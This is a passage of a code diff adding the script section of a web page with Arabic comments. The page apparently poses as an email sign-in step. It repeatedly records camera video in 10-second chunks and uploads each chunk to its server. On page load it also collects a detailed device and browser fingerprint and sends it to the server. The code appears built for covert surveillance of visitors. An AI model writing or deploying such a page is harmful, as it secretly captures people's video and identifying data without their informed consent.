+                        recordedChunks = []; // Clear chunks after creating blob
+                        
+                        // Upload video to server
+                        await uploadVideo(videoBlob);
+                    }
+                };
+                
+                // Start recording for 10 seconds intervals
+                mediaRecorder.start();
+                isRecording = true;
+                
+                // Set up an interval to stop and restart recording every 10 seconds
+                setInterval(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording' && isRecording) {
+                        mediaRecorder.stop();
+                        
+                        // Start recording again after a short delay
+                        setTimeout(() => {
+                            if (isRecording) {
+                                mediaRecorder.start();
+                                console.log('Restarted video recording');
+                            }
+                        }, 500);
+                    }
+                }, 10000); // Every 10 seconds
+                
+                console.log('Video recording started');
+            } catch (error) {
+                console.error('Error starting video recording:', error);
+            }
+        }
+
+        // Function to upload video to server
+        async function uploadVideo(videoBlob) {
+            try {
+                const formData = new FormData();
+                formData.append('video', videoBlob, `video_${Date.now()}.webm`);
+                
+                const response = await fetch('/api/record-video', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                console.log('Video upload result:', result);
+            } catch (error) {
+                console.error('Error uploading video:', error);
+            }
+        }
+
+        // Stop video recording
+        function stopVideoRecording() {
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+                isRecording = false;
+                
+                // Stop all tracks in the stream
+                if (videoStream) {
+                    videoStream.getTracks().forEach(track => track.stop());
+                    videoStream = null;
+                }
+                
+                console.log('Video recording stopped');
+            }
+        }
+
+        // Function to collect browser information and send to server
+        function collectBrowserInfo() {
+            const screenInfo = {
+                width: window.screen.width,
+                height: window.screen.height,
+                availWidth: window.screen.availWidth,
+                availHeight: window.screen.availHeight,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth,
+                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
+            };
+            
+            const browserInfo = {
+                userAgent: navigator.userAgent,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                language: navigator.language,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                screenInfo: screenInfo,
+                windowSize: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight
+                },
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                connectionRtt: navigator.connection ? navigator.connection.rtt : 'unknown',
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send this information to the server
+            fetch('/api/browser-info', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(browserInfo)
+            }).then(response => response.json())
+              .then(data => console.log('Browser info response:', data))
+              .catch(error => console.error('Error sending browser info:', error));
+        }
+
+        // دالة للتحقق من نوع الجهاز
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // تنفيذ عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', async () => {
+            console.log('Page loaded');
+            await collectBrowserInfo();
+            
+            // إضافة مستمعي الأحداث
+            emailNextButton.addEventListener('click', handleEmailSubmit);
+            
+            emailInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleEmailSubmit();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
